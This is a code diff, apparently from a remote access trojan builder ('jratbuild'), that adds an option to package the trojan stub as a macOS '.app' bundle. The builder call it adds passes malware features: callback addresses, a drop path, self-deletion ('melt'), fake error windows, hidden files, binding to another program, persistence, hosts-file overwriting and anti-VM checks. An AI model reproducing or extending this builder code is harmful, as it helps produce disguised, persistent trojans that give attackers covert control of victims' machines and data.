@@ -247,6 +247,18 @@ public class PanelBuildFinal extends JPanel {
 						BuildExecutable.build(temp.getAbsolutePath(), file, out.frameExecutableInfo);
 
 						temp.delete();
+					} else if (out.useApp()) {
+						File temp = File.createTempFile("jratbuild", ".jar");
+
+						Build.build(new AdvancedBuildListener(frame), Globals.getStub(), temp, addresses, ID, pass, crypt, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, runNextBoot, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, plist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true, config, antivm);
+
+						if (!file.toLowerCase().endsWith(".app")) {
+							file = file + ".app";
+						}
+
+						BuildExecutable.build(temp.getAbsolutePath(), file, out.frameExecutableInfo);
+
+						temp.delete();
 					} else {				
 						Build.build(new AdvancedBuildListener(frame), Globals.getStub(), new File(file), addresses, ID, pass, crypt, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, runNextBoot, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, plist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true, config, antivm);		
 					}
